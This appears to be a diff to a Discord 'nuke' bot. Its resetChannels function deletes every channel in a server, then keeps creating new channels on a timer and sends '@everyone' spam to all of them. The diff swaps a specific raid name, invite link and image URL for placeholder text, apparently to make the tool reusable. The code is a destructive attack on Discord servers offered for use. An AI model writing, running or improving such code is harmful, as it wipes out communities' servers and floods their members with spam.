@@ -384,7 +384,7 @@ async function resetChannels(guild) {
   try {
     console.log(" Resetting server channels...");
 
-    // 1️⃣ DELETE ALL CHANNELS
+    //  DELETE ALL CHANNELS
     const channels = guild.channels.cache;
     for (const [channelID, channel] of channels) {
       await channel.delete();
@@ -392,13 +392,13 @@ async function resetChannels(guild) {
     }
 
 
-    // 2️⃣ CREATE NEW CHANNELS
+    // 2 CREATE NEW CHANNELS
     CreateChannelsinterval = setInterval(async () => {
       const newChannel = await guild.channels.create({
-        name: "pcontop",
+        name: "Your name here",
         type: 0, // 0 = Text Channel
       });
-        sendMessageToAllChannels(guild, "@everyone pcontop join https://discord.gg/tokyosmm https://cdn.discordapp.com/attachments/1235748246983540827/1336511833896390757/image.png?ex=67a41324&is=67a2c1a4&hm=7e9124e50486fc93b46093c3fd43218fa7df26c6bced8c0dd01bbf5553ea12b1&"); // Send message after all channels are created
+        sendMessageToAllChannels(guild, "Your message"); // Send message after all channels are created
  
  
 /*
